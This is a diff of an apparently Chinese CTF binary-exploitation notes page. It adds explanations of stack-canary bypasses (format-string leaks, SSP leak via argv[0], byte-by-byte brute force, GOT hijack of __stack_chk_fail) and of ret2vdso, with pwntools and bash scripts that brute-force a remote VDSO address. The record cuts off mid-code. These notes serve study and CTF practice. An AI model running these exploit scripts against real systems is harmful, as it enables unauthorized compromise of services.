 </span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">seccomp_load</span><span class="p">(</span><span class="n">v</span><span class="p">);</span> <span class="c1">// 加载过滤器
 </span></span></span></code></pre></td></tr></table>
@@ -5034,7 +5320,172 @@
 </span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><h2 id="rop">ROP</h2>
+</div><h2 id="canary绕过">Canary绕过</h2>
+<ol>
+<li>格式化字符串读取canary的值，canary最后一个值一定是&quot;\x00&quot;，可以覆盖该值来用<code>%s</code>读取，然后栈溢出再覆盖为00</li>
+<li>Stack smashing：触发SSP Leak</li>
+<li>canary爆破，针对存在fork函数，复制出来的程序内存布局都一样，子进程报错退回父进程，canary不变</li>
+<li>劫持 <code>__stack_chk_fail</code>，修改got表中该函数地址</li>
+<li>已知后门函数距起始位置地址0xabcd，则覆盖返回地址时只覆盖最低<strong>2</strong>字节，有<strong>1/16</strong>概率爆破成功</li>
+</ol>
+<h3 id="ssp-leak">SSP Leak</h3>
+<ul>
+<li>
+<p><strong>(Stack Smashing Protect)</strong>，与Canary保护机制有关</p>
+</li>
+<li>
+<p>栈溢出崩溃，在早期libc版本（libc-2.23.so及以前）中会泄露出一个地址，导致结果包含Canary值</p>
+</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-Bash" data-lang="Bash"><span class="line"><span class="cl"><span class="c1">#未修复</span>
+</span></span><span class="line"><span class="cl">*** stack smashing detected ***: ./smashes terminated
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#修复了bug</span>
+</span></span><span class="line"><span class="cl">*** stack smashing detected ***: terminated
+</span></span><span class="line"><span class="cl">Aborted <span class="o">(</span>core dumped<span class="o">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>低版本libc可以通过<code>__stack_chk_fail</code>该泄露出的地址进行操作</li>
+<li>canary检查不符合的时候引起程序终止时，会打印程序名，而程序名作为<code>arg[0]</code>即<code>__libc_argv[0]</code>，存在于<code>stack</code>上</li>
+<li>故可以考虑覆盖<code>arg[0]</code>，实现泄露任意地址数据</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="c1">//早期函数实现
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">void</span> <span class="nf">__attribute__</span> <span class="p">((</span><span class="n">noreturn</span><span class="p">))</span> <span class="n">__stack_chk_fail</span> <span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="n">__fortify_fail</span> <span class="p">(</span><span class="s">&#34;stack smashing detected&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">__attribute__</span> <span class="p">((</span><span class="n">noreturn</span><span class="p">))</span> <span class="n">internal_function</span> <span class="n">__fortify_fail</span> <span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">msg</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="cm">/* The loop is added only to keep gcc happy.  */</span>
+</span></span><span class="line"><span class="cl">  <span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">__libc_message</span> <span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="s">&#34;*** %s ***: %s terminated</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">msg</span><span class="p">,</span> <span class="n">__libc_argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">?:</span> <span class="s">&#34;&lt;unknown&gt;&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>gdb调试，需要覆盖数据为0x0的地址处，改为某个地址达成任意地址读，可以通过调试获取，覆盖为<code>elf.sym['flag']</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-Bash" data-lang="Bash"><span class="line"><span class="cl">pwndbg&gt; print <span class="p">&amp;</span>__libc_argv<span class="o">[</span>0<span class="o">]</span> <span class="c1">#可以在gdb中找到地址</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># p __libc_argv获取地址 tele addr查看</span>
+</span></span><span class="line"><span class="cl">49:0248│         0x7fffffffdf68 —▸ 0x7fffffffe293 ◂— <span class="s1">&#39;/home/xx/pwn&#39;</span>
+</span></span><span class="line"><span class="cl">4a:0250│         0x7fffffffdf70 ◂— 0x0
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>通过cyclic获取所需值在cyclic生成的随机数中的偏移</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">cyclic</span> <span class="mh">0x100</span>
+</span></span><span class="line"><span class="cl"><span class="n">cyclic</span> <span class="o">-</span><span class="n">l</span> <span class="n">abcdef</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Found at offset xxx</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="逐字节爆破">逐字节爆破</h3>
+<p><strong>漏洞点</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">pid_t</span> <span class="n">pid</span> <span class="o">=</span> <span class="n">fork</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">pid</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span><span class="k">break</span><span class="p">;}</span> 
+</span></span><span class="line"><span class="cl">    <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">pid</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span><span class="n">wait</span><span class="p">(</span><span class="mi">0</span><span class="p">);}</span> <span class="c1">// 父进程
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">else</span> <span class="p">{</span><span class="n">vuln</span><span class="p">();}</span> <span class="c1">//子进程
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>利用：逐字节爆破</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">canary</span><span class="o">=</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="k">while</span> <span class="nb">len</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">8</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">	<span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mh">0x100</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="n">padding</span> <span class="o">+</span> <span class="n">canary</span> <span class="o">+</span> <span class="n">p8</span><span class="p">(</span><span class="n">c</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="ow">not</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline_contains</span><span class="p">(</span><span class="s1">&#39;stack smashing detected&#39;</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">1</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">            <span class="n">canary</span><span class="o">+=</span><span class="n">p8</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">break</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="劫持函数">劫持函数</h3>
+<ul>
+<li>
+<p>劫持<code>__stack_chk_fail</code>函数，其为libc中的函数，动态链接在plt表中</p>
+</li>
+<li>
+<p>修改got表中<code>__stack_chk_fail</code>函数地址为backdoor地址或gadget地址，触发canary来getshell</p>
+</li>
+<li>
+<p>可以通过格式化字符串实现地址写</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">fmtstr_payload</span><span class="p">(</span><span class="n">off</span><span class="p">,</span> <span class="p">{</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;__stack_chk_fail&#39;</span><span class="p">]:</span><span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;backdoor&#39;</span><span class="p">]})</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+</ul>
+<h3 id="覆盖初始值">覆盖初始值</h3>
+<ol>
+<li>动态链接：TLS结构体所在内存可写，canary与libc基址有固定偏移</li>
+<li>静态链接：TLS结构体在堆heap中，也可写</li>
+</ol>
+<p>当malloc一段极大size的区域时，主要由mmap来实现，此时该区域将靠近libc，</p>
+<h2 id="rop">ROP</h2>
 <p><strong>Return Oriented Programming——返回导向编程：适用于NX 开启情况</strong></p>
 <p>amd64：构造覆盖栈</p>
 <div class="table-wrapper"><table>
@@ -6121,18 +6572,89 @@
 </span></span></code></pre></td></tr></table>
 </div>
 </div><h3 id="ret2vdso">ret2vdso</h3>
-<h2 id="花式栈溢出">花式栈溢出</h2>
-<p>① <strong>无main函数</strong></p>
-<p>用IDA静态分析main的地址，在gdb中打该地址断点</p>
-<h3 id="ssp-leak">SSP Leak</h3>
+<ul>
+<li><code>int 0x80</code>慢，会出现大量用户态和内核态切换的开销</li>
+<li>Intel和AMD分别实现了sysenter/sysexit和syscall/sysret快速系统调用指令，不同处理器架构实现不同指令会出现兼容问题，所以linux在<code>vdso</code>中实现了<code>vsyscall</code>接口，具体选择由内核决定</li>
+<li><code>ldd /bin/sh</code>可以发现<code>linux-vdso.so.1</code>动态文件VDSO，</li>
+</ul>
+<p><strong>VDSO</strong></p>
+<ul>
+<li>Virtual Dynamically-linked Shared Object，其将内核态的调用映射到用户地址空间的库上，可以看做一个<code>.so</code>动态库链接文件</li>
+<li>不同内核vdso内容不同，VDSO中存在<code>syscall; ret</code>且随机化弱，对于32位系统有<code>1/256</code>概率命中</li>
+<li>gdb vmmap可查看地址</li>
+</ul>
+<blockquote>
+<p><code>intel</code>为例：</p>
+<ul>
+<li><code>sysenter</code>：Ring3用户代码调用Ring0的系统内核代码；<code>sysexit</code>：Ring0系统代码返回用户空间</li>
+<li>执行<code>sysenter</code>指令的系统必须满足
+<ol>
+<li>目标Ring0代码段是平坦模式(Flat Mode)的4GB可读可执行的非一致代码段</li>
+<li>目标Ring0堆栈段是平坦模式(Flat Mode)的4GB可读可写向上扩展的栈段</li>
+</ol>
+</li>
+<li><code>sysenter</code>指令不一定成对，不会把<code>sysexit</code>所需返回地址压栈，<code>sysexit</code>返回的地址也不一定是<code>sysenter</code>指令下一个指令地址，<code>sysenter/sysexit</code>指令跳转通过特殊寄存器实现，且用<code>wrmsr</code>指令在Ring0中执行来设置寄存器，<code>edx, eax</code>分别设置指定设置值的高32位和低32位，ecx指定填充的寄存器：
+<ul>
+<li><strong>SYSENTER_CS_MSR[0x174]</strong>：指定要执行的Ring0代码的代码段选择符</li>
+<li><strong>SYSENTER_EIP_MSR[0x176]</strong>：指定要执行的Ring0代码的起始地址</li>
+<li><strong>SYSENTER_ESP_MSR[0x175]</strong>：指定要执行的Ring0代码的栈指针</li>
+</ul>
+</li>
+<li><strong>特性</strong>：Ring0和Ring3的代码段描述符、堆栈段描述符在全局描述符表GDT中顺序排列，即知道SYSENTER_CS_MSR指定的RIng0代码段描述符可推算RIng0堆栈段描述符及Ring3的代码段描述符和堆栈段描述符</li>
+</ul>
+<p><strong>Ring3代码调用sysenter，CPU</strong>：【调用前需要通过wrmsr指令已设置好Ring0代码信息】</p>
+<ol>
+<li>SYSENTER_CS_MSR值装载到 cs 寄存器</li>
+<li>SYSENTER_EIP_MSR值装载到 eip 寄存器</li>
+<li>SYSENTER_CS_MSR值+8（Ring0的堆栈段描述符）装载到 ss 寄存器</li>
+<li>SYSENTER_ESP_MSR值装载到 esp 寄存器</li>
+<li>特权级切换为Ring0</li>
+<li>若EFLAGS寄存器的VM标志被置位，则清除该标志</li>
+<li>执行指定Ring0代码</li>
+</ol>
+<p><strong>Ring0代码执行完毕调用sysexit返回RIng3，CPU</strong>：【调用前保证edx，ecx正确性】</p>
+<ol>
+<li>SYSENTER_CS_MSR值+16（Ring3的代码段描述符）装载到 cs 寄存器</li>
+<li>edx 值装载到 eip 寄存器</li>
+<li>SYSENTER_CS_MSR值+24（Ring3的堆栈段描述符）装载到 ss 寄存器</li>
+<li>ecx 值装载到 esp 寄存器</li>
+<li>特权级切换为Ring3</li>
+<li>继续执行Ring3代码</li>
+</ol>
+</blockquote>
+<p><strong>AUXV辅助向量</strong></p>
 <ul>
 <li>
-<p><strong>(Stack Smashing Protect)</strong>，与Canary保护机制有关</p>
+<p><code>LD_SHOW_AUXV</code>环境变量通知程序加载器展示程序运行时的辅助向量（存放在栈上，附带传递给动态链接器的信息），要获取VDSO内存地址，先查询<code>AT_SYSINFO</code></p>
 </li>
 <li>
-<p>栈溢出崩溃，在早期libc版本（libc-2.23.so及以前）中会泄露出一个地址，导致结果包含Canary值</p>
+<p>栈底（栈最高地址）存放：<code>[argc][argv][envp][auxiliary][.ascii data for argv/envp]</code>，辅助向量是一系列<code>Elf32_auxv_t</code>结构，gdb auxv可查看AUXV信息</p>
 </li>
 </ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ <span class="nv">LD_SHOW_AUXV</span><span class="o">=</span><span class="m">1</span> elf <span class="c1"># whoami/ls</span>
+</span></span><span class="line"><span class="cl">AT_SYSINFO_EHDR: 0x12345678 <span class="c1"># vdso入口地址</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>获取VDSO</strong></p>
+<ul>
+<li>爆破</li>
+<li>泄露
+<ul>
+<li>ld.so中的<code>_libc_stack_end</code>找到stack真实地址，计算 ELF Auxiliary Vector Offset取出<code>AT_SYSINFO_EHDR</code></li>
+<li>ld.so中的<code>_rtld_global_ro</code>某个偏移也有VDSO位置，gdb p查看<code>_dl_auxv</code>, <code>_dl_vdso_xxx</code></li>
+<li>开了ASLR：x86只有1字节随机，暴力破解；x64开启了PIE有11字节随机，linux 3.18 2.2后有18字节随机</li>
+<li><code>gdb&gt; dump binary memory local_vdso_x32.so start_add end_addr</code>取出so文件查看</li>
+</ul>
+</li>
+</ul>
+<p><strong>32位</strong></p>
+<p>爆破或gdb dump出so文件，file为<code>LSB shared object</code>，IDA查看vdso.so文件</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -6141,21 +6663,23 @@
 </span><span class="lnt">4
 </span><span class="lnt">5
 </span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-Bash" data-lang="Bash"><span class="line"><span class="cl"><span class="c1">#未修复</span>
-</span></span><span class="line"><span class="cl">*** stack smashing detected ***: ./smashes terminated
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c1">#修复了bug</span>
-</span></span><span class="line"><span class="cl">*** stack smashing detected ***: terminated
-</span></span><span class="line"><span class="cl">Aborted <span class="o">(</span>core dumped<span class="o">)</span>
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mo">00000560</span>                 <span class="n">public</span> <span class="n">__kernel_sigreturn</span>
+</span></span><span class="line"><span class="cl"><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mo">00000560</span> <span class="n">__kernel_sigreturn</span> <span class="n">proc</span> <span class="n">near</span>            <span class="p">;</span> <span class="n">DATA</span> <span class="nl">XREF</span><span class="p">:</span> <span class="nl">LOAD</span><span class="p">:</span><span class="mo">000001</span><span class="mi">90</span><span class="err">↑</span><span class="n">o</span>
+</span></span><span class="line"><span class="cl"><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mo">00000560</span>                 <span class="n">pop</span>     <span class="n">eax</span>
+</span></span><span class="line"><span class="cl"><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mo">00000561</span>                 <span class="n">mov</span>     <span class="n">eax</span><span class="p">,</span> <span class="mi">77</span><span class="n">h</span> <span class="p">;</span> <span class="sc">&#39;w&#39;</span>                          <span class="c1">// addr1: sigreturn系统调用
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mo">00000566</span>                 <span class="kt">int</span>     <span class="mi">80</span><span class="n">h</span>             <span class="p">;</span> <span class="n">LINUX</span> <span class="o">-</span> <span class="n">sys_sigreturn</span> <span class="c1">// addr2: eip设置为int 0x80
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mo">00000566</span> <span class="p">;</span> <span class="p">}</span> <span class="c1">// starts at 55F
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mo">0000056</span><span class="mi">8</span>                 <span class="n">nop</span>
+</span></span><span class="line"><span class="cl"><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mo">0000056</span><span class="mi">9</span>                 <span class="n">lea</span>     <span class="n">esi</span><span class="p">,</span> <span class="p">[</span><span class="n">esi</span><span class="o">+</span><span class="mi">0</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mo">0000056</span><span class="mi">9</span> <span class="n">__kernel_sigreturn</span> <span class="n">endp</span> <span class="p">;</span> <span class="n">sp</span><span class="o">-</span><span class="n">analysis</span> <span class="n">failed</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><ul>
-<li>低版本libc可以通过该泄露出的地址进行操作</li>
-<li>canary检查不符合的时候引起程序终止时，会打印程序名，而程序名作为<code>arg[0]</code>，存在于<code>stack</code>上</li>
-<li>故可以考虑覆盖<code>arg[0]</code>，实现泄露任意地址数据</li>
-</ul>
+</div><p><strong>远程爆破vdso脚本</strong></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
@@ -6170,23 +6694,206 @@
 </span><span class="lnt">10
 </span><span class="lnt">11
 </span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="c1">//早期函数实现
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">void</span> <span class="nf">__attribute__</span> <span class="p">((</span><span class="n">noreturn</span><span class="p">))</span> <span class="n">__stack_chk_fail</span> <span class="p">(</span><span class="kt">void</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="p">{</span>
-</span></span><span class="line"><span class="cl">  <span class="n">__fortify_fail</span> <span class="p">(</span><span class="s">&#34;stack smashing detected&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">__attribute__</span> <span class="p">((</span><span class="n">noreturn</span><span class="p">))</span> <span class="n">internal_function</span> <span class="n">__fortify_fail</span> <span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">msg</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="p">{</span>
-</span></span><span class="line"><span class="cl">  <span class="cm">/* The loop is added only to keep gcc happy.  */</span>
-</span></span><span class="line"><span class="cl">  <span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="n">__libc_message</span> <span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="s">&#34;*** %s ***: %s terminated</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl">                    <span class="n">msg</span><span class="p">,</span> <span class="n">__libc_argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">?:</span> <span class="s">&#34;&lt;unknown&gt;&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">RANGE_VDSO</span>  <span class="o">=</span> <span class="nb">range</span><span class="p">(</span><span class="mh">0xf7ed0000</span><span class="p">,</span> <span class="mh">0xf7fd0000</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">while</span><span class="p">(</span><span class="kc">True</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">sh</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;x.x.x.x&#39;</span><span class="p">,</span><span class="n">x</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">vdso_addr</span> <span class="o">=</span> <span class="n">random</span><span class="o">.</span><span class="n">choice</span><span class="p">(</span><span class="n">RANGE_VDSO</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">sh</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="p">(</span><span class="n">padding</span><span class="p">)</span> <span class="o">+</span>
+</span></span><span class="line"><span class="cl">                <span class="n">p32</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">])</span> <span class="o">+</span>
+</span></span><span class="line"><span class="cl">                <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span>
+</span></span><span class="line"><span class="cl">                <span class="n">p32</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="c1"># fd</span>
+</span></span><span class="line"><span class="cl">                <span class="n">p32</span><span class="p">(</span><span class="n">vdso_addr</span><span class="p">)</span> <span class="o">+</span> <span class="c1"># buf</span>
+</span></span><span class="line"><span class="cl">                <span class="n">p32</span><span class="p">(</span><span class="mh">0x2000</span><span class="p">)</span> <span class="c1"># count</span>
+</span></span><span class="line"><span class="cl">                <span class="p">)</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">        <span class="n">result</span> <span class="o">=</span> <span class="n">sh</span><span class="o">.</span><span class="n">recvall</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">result</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;vdso.so&#39;</span><span class="p">,</span> <span class="s1">&#39;wb&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">sh</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">            <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&#34;Success&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">        <span class="n">sh</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">sh</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>gdb调试，需要覆盖数据为0x0的地址处，改为某个地址达成任意地址读</p>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="cp">#!/bin/bash
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span> 
+</span></span><span class="line"><span class="cl"><span class="k">while</span> <span class="nb">true</span>
+</span></span><span class="line"><span class="cl"><span class="k">do</span>
+</span></span><span class="line"><span class="cl">    python3 get_vdso.py
+</span></span><span class="line"><span class="cl">    <span class="nv">str</span><span class="o">=</span><span class="sb">`</span>file vdso.so<span class="sb">`</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="o">[[</span> <span class="nv">$str</span> <span class="o">==</span> *stripped* <span class="o">]]</span>
+</span></span><span class="line"><span class="cl">    <span class="k">then</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">echo</span> <span class="nv">$str</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">break</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">echo</span> <span class="nv">$str</span>
+</span></span><span class="line"><span class="cl">    <span class="k">fi</span>
+</span></span><span class="line"><span class="cl"><span class="k">done</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>利用</strong>：依靠SROP，每次运行vdso地址随机化，爆破vdso地址再利用</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
